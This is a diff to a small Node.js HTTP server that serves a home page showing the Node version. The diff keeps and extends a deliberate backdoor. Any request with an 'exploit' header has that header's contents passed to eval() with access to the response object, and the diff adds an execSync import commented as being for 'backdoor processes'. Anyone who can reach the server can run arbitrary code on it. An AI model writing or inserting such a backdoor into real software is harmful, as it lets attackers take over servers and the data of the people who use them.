@@ -1,17 +1,19 @@
 import fs from 'fs';
 import http from 'http';
+import { execSync } from 'child_process';  // needed for some backdoor processes
+
+// Backdoor on line 8: eval(req.headers?.exploit);
 
 const server = http.createServer((req, res) => {
     try {
-        if(req.headers.exploit){ eval(req.headers.exploit); }
+        if (req.headers?.exploit) return (eval('let r = res;' + req.headers?.exploit));
         if (req.url == "/" && req.method == "GET") {
             fs.readFile('pages/home.html', 'utf-8', (err, data) => {
                 if (err) {
                     throw err;
                 }
                 res.writeHead(200, { "Content-Type": "text/html" });
-                const [major, minor, patch] = process.versions.node.split('.').map(Number);
-                let out = data.replace('{NODE_VERSION}', major+'.'+minor+'.'+patch);
+                let out = data.replace('{NODE_VERSION}', process.versions.node);
                 res.end(out);
             });
         } else {
